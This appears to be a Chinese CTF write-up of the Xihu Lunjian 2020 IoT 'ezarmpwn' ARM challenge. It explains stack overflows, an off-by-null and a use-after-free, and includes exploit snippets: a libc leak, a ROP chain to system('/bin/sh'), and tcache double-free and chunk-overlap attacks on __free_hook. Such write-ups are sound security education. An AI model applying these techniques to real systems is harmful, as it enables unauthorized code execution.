---
title: 西湖论剑 2020 IoT闯关赛 pwn3 ezarmpwn 题目分析与多种利用方式
description: 详细分析西湖论剑 2020 IoT 闯关赛 pwn3 ezarmpwn 题目，涵盖 32 位 ARM 程序的栈溢出、UAF、Off-by-null
  等漏洞，以及基于栈上 libc 地址泄露的 ROP 利用、Double Free 与 Chunk Overlap 两种堆利用方式的完整复现。
category: program-analysis
tags:
- CTF
- Pwn
- ARM
- Stack Overflow
- UAF
- Double Free
- Chunk Overlap
- ROP
- Libc Leak
- Xihu Argument Sword
- IoT Security
- glibc 2.30
date: '2020-01-01'
updated: '2026-11-12'
---
## 挑战概况

- **赛事**：西湖论剑 2020 IoT 闯关赛
- **题目**：pwn3 ezarmpwn
- **运行环境**：32 位 ARM 小端（`armv7`），NX 开启，**无 PIE、无 Canary**
- **Libc 版本**：glibc 2.30（主办方提供）
- **启动方式**：`qemu-arm -L ./ ./pwn3`
- **交互流程**：注册用户名/密码 → 菜单（Play/Add/Delete、私人信息、修改密码、退出）

## 二进制基本属性

| 属性 | 值 |
|------|-----|
| 架构 | ARM 32-bit, Little Endian |
| 保护 | NX ✅ \| PIE ❌ \| Canary ❌ \| RELRO Partial |
| 关键函数 | `register`、`change_password`、`play_add`、`play_delete`、`info` |

> 保护机制背景可参考 [[linux-kernel-hardening-mechanisms]] 中关于编译期硬化与内存保护的章节。

## 漏洞清单

### 栈溢出 1 —— 用户名注册处 `scanf` 无长度限制
- **位置**：`register` 函数读取用户名
- **缓冲区**：固定长度（约 0x20 字节）
- **触发**：直接 `scanf("%s", buf)`，可覆盖返回地址
- **限制**：GOT 表项含 `0x20`（空格），`scanf` 会截断，导致常规 ROP 链构造受阻

### Off-by-null —— 密码读取循环
- **位置**：注册时读取密码
- **成因**：若输入无 `\n`，指针持续后移，最终在遇到 `\n` 处写 `0`
- **评价**：利用难度极高，属干扰项

### Use-After-Free (UAF) —— Play 菜单堆管理
- **结构体**：
  ```c
  struct note { int size; char *content; };
  ```
- **漏洞**：`delete` 仅 `free(content)`，**未置空指针**，且结构体数组位于预分配区
- **利用难点**：Libc 2.30 引入 tcache，Double Free 需填满 tcache；结构体不在堆上，无法直接覆盖 `fd`

### 栈溢出 2 —— 修改密码 `strncpy` 长度错误
- **位置**：`change_password` 函数
- **缓冲区**：密码 buffer 40 字节
- **复制长度**：`strncpy(dest, src, 0x48)` → **溢出 8 字节**
- **可控范围**：仅能覆盖保存的 `LR`（返回地址），无空间布置完整 ROP 链

## 核心利用思路：栈上 Libc 地址泄露

### 观察
在 `change_password` 读取临时缓冲区的栈帧上，紧邻 password buffer 处存有 **Libc 函数返回地址**（如 `__libc_start_main+248`）。

### 利用步骤
1. 调用「修改密码」，输入 **40 字节填充**（如 `'a'*40`）
2. `strncpy` 将 0x48 字节复制进 password buffer，**连带把栈上相邻的 libc 地址一起拷贝进去**
3. 选择「私人信息」输出用户名/密码，**泄露 password buffer 内容**，即得到 libc 地址
4. 计算基址：`libc_base = leaked_addr - offset`（文中偏移 `0x32248`）

```python
change('a'*40)
info()
io.recvuntil('a'*40)
libc_addr = u32(io.recv(4)) - 0x32248
```

> 该技巧在存在「回显功能」的菜单题中通用，后续分析同类题目时可优先检查栈布局。

## 利用路线一：双栈溢出联动 ROP

### 整体链路
1. **栈溢出 2** 劫持 `PC` → 跳转至程序入口/注册函数 **再次触发栈溢出 1**
2. **栈溢出 1** 布置完整 ROP 链 → `system("/bin/sh")`

### 关键 Gadget（程序基址 0x10000）
| 地址 | 指令 | 作用 |
|------|------|------|
| `0x10784` | `pop {r4, pc}` | 控制 R4 与 PC |
| `0x0a1a5c` (libc) | `mov r0, r4; blx r3` | 将 R4 作为 `system` 参数，跳转 R3 |

### ROP 链构造
```python
# 第二次溢出：劫持 PC 到 0x10e70（程序重入点）
change(b'a'*64 + p32(0x10e70))
io.sendlineafter('choice > ', '4')   # 触发退出，走到被劫持的 LR

# 第三次溢出（栈溢出 1）：用户名输入 ROP 链
bin_sh = libc_addr + 0x127c4c        # "/bin/sh" 偏移
system = libc_addr + 0x03a028
payload = b'c'*0x1c + p32(0x10784) + p32(bin_sh) + p32(libc_addr + 0x0a1a5c) + p32(system)
io.sendlineafter('username:', payload)
io.sendlineafter('password:', '')    # 空密码避免坏字符 0x20/0x0a 干扰
```

### 坏字符处理
- `system` 地址含 `0x20`，**本地 qemu-user 无法通过 `scanf` 传入**，需在实体开发板/完整 qemu-system 运行
- 空密码仅写入单字节 `0x00`，不破坏 ROP 链

## 利用路线二：UAF — Double Free 劫持 `__free_hook`

### 前置条件
- 已泄露 libc 基址
- 已知 `__free_hook`、`system` 偏移

### 步骤
1. **填满 tcache[0x30]**：分配 10 个 0x30 chunk（索引 0-9）
2. **释放 7 个** 进入 tcache（索引 0-6）
3. **构造 Double Free**：
   ```python
   dele(7); dele(8); dele(7)   # 7→8→7 形成 fastbin-like 循环
   ```
4. **重新分配 7 个** 填满 tcache（索引 20-26）
5. **申请 chunk 指向 `__free_hook`**：
   ```python
   add(30, 0x30, p32(libc + e.symbols['__free_hook']))
   ```
6. **两次垃圾分配** 推进 tcache 指针
7. **写入 `system` 地址**：
   ```python
   add(34, 0x30, p32(libc + e.symbols['system']))
   ```
8. **释放含 `/bin/sh` 的 chunk** 触发 `system("/bin/sh")`

> 该思路与 [[mtctf-2021-pwn-writeup]] 中 `zlink` 题劫持 `__free_hook` 流程一致，均属 glibc 2.29+ tcache 环境下的标准 Double Free 利用模板。

## 利用路线三：UAF — Chunk Overlap 篡改 tcache 指针

### 核心思想
通过 **Unsorted Bin 合并** 制造 Overlap，将大 chunk 的 `fd` 覆盖为 `__free_hook`，再次进入 tcache 实现任意写。

### 步骤
1. 分配 9 个 0x40 chunk（索引 0-8）+ 2 个 0x10 chunk（索引 14,15）
2. 释放 0x10 chunk 进入 `tcache[0x10]`：`14 → 15`
3. **逆序释放 9 个 0x40 chunk** 进入 Unsorted Bin，形成连续大块
4. 申请 0x70 chunk（索引 9），**覆盖索引 1 的 chunk header**：
   - 伪造 `size=0x39`（tcache 0x10 范围）
   - `fd` 指向 `tcache[0x10]` 头部
5. `delete(1)` → 伪造 chunk 进入 `tcache[0x10]`，劫持链表头
6. `delete(9)` → 释放大 chunk
7. 重新申请 0x70 chunk，写入 `__free_hook` 到 `fd`
8. 后续同 Double Free：分配两次垃圾 + 写 `system` + 释放 `/bin/sh`

```python
# 关键伪造 payload
add(9, 0x70, "a"*0x40 + p32(0) + p32(0x11) + p32(0)*3 + p32(0x39) + "\n")
# 后续写入 __free_hook
add(10, 0x70, "a"*0x40 + p32(0) + p32(0x11) + p32(free_hook)*3 + p32(0x39) + p32(free_hook) + "\n")
```

## 完整 Exploit 脚本摘要

| 脚本 | 核心技术 | 适用场景 |
|------|----------|----------|
| `exp_rop.py` | 双栈溢出 + ROP | 无需堆操作，适合调试器受限环境 |
| `exp_uaf_double_free.py` | UAF + Double Free + `__free_hook` | 标准 glibc 2.30 tcache 利用 |
| `exp_uaf_chunk_overlap.py` | UAF + Chunk Overlap + tcache 污染 | 展示高级堆布局能力 |

> 完整代码见文章末尾三个代码块，已在文中内联展示关键片段。

## 调试与逆向工程提示

1. **无符号 Libc 调试**：`gdb` + `pwndbg` 无法直接使用 `bins`/`chunks` 命令
   - **手动定位**：`tcache_perthread_struct` 位于 **heap 基址**；`main_arena` 偏移固定（文中 `0x14675c`）
   - 可结合 [[ida-pro-tips-plugins-python]] 中 FLIRT 签名恢复符号、Findcrypt-Yara 识别加密常量

2. **ARM 调试**：
   - `qemu-arm -g 1234` + `gdb-multiarch`
   - 注意 ARM/Thumb 模式切换，`pc` 值最低位指示模式

3. **坏字符集**：`0x00`、`0x0a`、`0x20`、`0x0d` 均会被 `scanf`/`strncpy` 截断或过滤，构造 payload 时需逐字节验证

## 经验总结与迁移指南

| 知识点 | 迁移建议 |
|--------|----------|
| **栈上 libc 地址泄露** | 遇到「回显功能」+「栈溢出可控长度」时，优先检查栈帧是否残留 libc 指针 |
| **双栈溢出联动** | 单次溢出长度不足时，考虑用短溢出劫持 PC 到长溢出入口 |
| **tcache Double Free** | glibc ≥ 2.29 必须先填满 tcache（7 个），再构造 `A→B→A` 循环 |
| **Chunk Overlap** | 利用 Unsorted Bin 合并特性，伪造 size 将大 chunk 降级进入小 bin/tcache |
| **ARM ROP 坏字符** | 实机/全系统模拟器运行；善用 `pop {r4, pc}` 等通用 gadget 规避空格截断 |

## 相关页面

- [[mtctf-2021-pwn-writeup]] — 堆利用通用技巧（UAF、Fastbin、Unlink、Double Free、setcontext）
- [[linux-kernel-hardening-mechanisms]] — NX/PIE/Canary 等缓解措施原理
- [[ida-pro-tips-plugins-python]] — 逆向辅助工具链（FLIRT、Findcrypt、Keypatch、IDAPython）

## 来源

- [0th3rs安全团队-201911-202204_057](../sources/0th3rs安全团队-201911-202204_057.md)
